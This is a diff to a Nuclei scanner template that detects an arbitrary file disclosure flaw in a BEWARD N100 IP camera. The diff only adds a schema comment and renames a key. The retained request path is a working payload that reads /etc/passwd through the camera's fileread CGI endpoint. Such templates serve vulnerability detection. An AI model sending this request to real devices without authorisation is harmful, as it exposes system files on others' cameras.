@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: beward-ipcamera-disclosure
 info:
   name: BEWARD N100 H.264 VGA IP Camera M2.1.6 Arbitrary File Disclosure
@@ -6,7 +7,7 @@ info:
   author: geeknik
   severity: high
   tags: beward,iot,camera,disclosure
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/cgi-bin/operator/fileread?READ.filePath=/etc/passwd"
